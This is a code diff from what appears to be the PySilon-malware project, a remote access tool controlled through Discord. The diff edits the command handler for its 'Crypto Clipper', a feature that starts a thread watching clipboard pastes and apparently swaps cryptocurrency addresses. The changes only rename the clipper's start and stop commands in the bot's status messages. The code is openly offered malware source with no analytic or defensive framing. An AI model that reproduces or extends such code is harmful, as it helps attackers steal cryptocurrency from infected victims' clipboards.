@@ -57,11 +57,11 @@ async def crypto_clipper(ctx, option=None):
 
             clipper_thread = threading.Thread(target=wait_for_paste)
             clipper_thread.start()
-            embed = discord.Embed(title="🟢 Crypto Clipper started!",description=f'```Crypto Clipper has been started! Stop it by using .stop-clipper```', colour=discord.Colour.green())
+            embed = discord.Embed(title="🟢 Crypto Clipper started!",description=f'```Crypto Clipper has been started! Stop it by using .clipper stop```', colour=discord.Colour.green())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
         else:
-            embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is already running! Stop it by using .stop-clipper```', colour=discord.Colour.red())
+            embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is already running! Stop it by using .clipper stop```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
 
@@ -73,7 +73,7 @@ async def crypto_clipper(ctx, option=None):
             await ctx.send(embed=embed)
             clipper_stop = True
         else:
-            embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is not running! Start it using .start-clipper```', colour=discord.Colour.red())
+            embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is not running! Start it by using .clipper start```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
 
